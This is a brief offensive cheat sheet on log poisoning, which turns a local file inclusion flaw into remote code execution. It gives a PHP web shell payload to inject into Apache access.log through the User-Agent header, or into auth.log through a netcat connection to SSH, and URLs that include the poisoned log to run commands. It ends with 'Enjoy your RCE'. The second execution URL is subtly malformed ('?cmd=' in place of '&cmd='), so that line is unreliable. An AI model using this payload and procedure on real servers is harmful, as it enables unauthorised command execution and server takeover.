# Log Poisoning

#### Log Poisoning occurs via LFI attack.

#### If you can access the file /var/log/apache2/access.log, you can inject a webshell as the User-Agent by using web proxy tools like Burpsuite and OWASP ZAP:

### 1) Locate a writable log file

    /var/log/apache2/access.log

### 2) Inject a payload

Inject a simple web shell payload into a request header (e.g., User-Agent or Referer) that the web server will log.

Payload:

    <?php echo system($_GET['cmd']); ?>

### 3) Execute via LFI

    http://example.com/vulnerable.php?page=/path/to/log/access.log&cmd=whoami

## Alternate poisoning method: SSH Log Poisoning

### 1) Locate the log file

    /var/log/auth.log

### 2) Poison the auth.log file

Connect to SSH port via netcat

    nc -nv IP 22

Inject payload

    <?php echo system($_GET['cmd']); ?>

### 3) Run commands via your webshell now

    http://domain.local/lfi.php?file=/var/log/auth.log?cmd=whoami

**Enjoy your RCE**
